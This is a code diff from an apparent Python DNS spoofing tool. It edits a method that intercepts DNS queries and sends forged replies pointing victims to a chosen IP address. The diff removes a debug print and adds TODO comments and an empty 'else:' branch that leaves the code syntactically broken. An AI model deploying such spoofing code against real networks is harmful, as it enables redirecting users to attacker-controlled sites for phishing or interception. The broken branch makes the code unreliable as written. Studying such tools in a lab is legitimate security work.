@@ -82,7 +82,6 @@ class dnsfinal():
 
     #method which does the DNS spoofing of a packet
     def doSpoofing(self, packet):
-        print("I got one!! ")
         if (packet.haslayer(DNS)) and (packet[DNS].qr == 0):
             #Case the user entered specific websites to spoof
             
@@ -103,7 +102,10 @@ class dnsfinal():
                 #send the packet
                 sendp(spoofedETHER/spoofedIP/spoofedUDP/spoofedDNS, iface=self.interface)
                 print("we spoofed IP: {}, Query: {}, response: {}".format(packet[IP].src, packet[DNS].qd.qname, self.ip_website))
-        #we intercepted a packet that was not ment to be modified, so we simply have to redirect it        
+            #TODO REDIRECT PACKETS TO DNS SERVER
+            else:
+            
+        #TODO REDIRECT       
         else:
             print(self.defaultGateway)
         
